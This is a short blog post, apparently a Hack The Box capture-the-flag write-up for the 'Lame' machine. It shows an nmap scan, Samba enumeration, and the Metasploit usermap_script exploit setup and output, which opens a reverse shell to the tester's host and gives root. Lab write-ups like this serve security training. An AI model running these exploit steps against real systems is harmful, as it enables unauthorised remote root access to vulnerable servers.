---
layout: post
title: Lame
date: 2020-03-30
author: th3-3inst3in
comments: true
categories: htb
tags: [Linux,htb]
---

## Legacy writeup

Easy linux machine

![main]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Lame/main.png)


Let's do a quick nmap all ports

```perl

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:                                                                                                                                                                                        
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)                                                                                                                                             
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)                                                                                                                                        
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)                                                                                                                                       
|_smb2-time: Protocol negotiation failed (SMB2)                                 

```

<br>

### Enumeration

- Tried to enumerate using smbclient

![smb-enum]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Lame/smbclient.png)


Found nothing As you can see I also tried to put an exploit on the shared folder but no seed. Tried to enumerate the version of the SMB using metasploit

```perl

msf5 auxiliary(scanner/smb/smb_version) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### Exploitation

Found an exploit for the Samba version found. ran that and got a root shell



```perl
msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.3
lhost => 10.10.14.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.3:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo jWLKJ2BffrrkAeob;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "jWLKJ2BffrrkAeob\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:33405) at 2020-03-30 03:39:07 -0400

id
uid=0(root) gid=0(root)

```
That's all pretty simple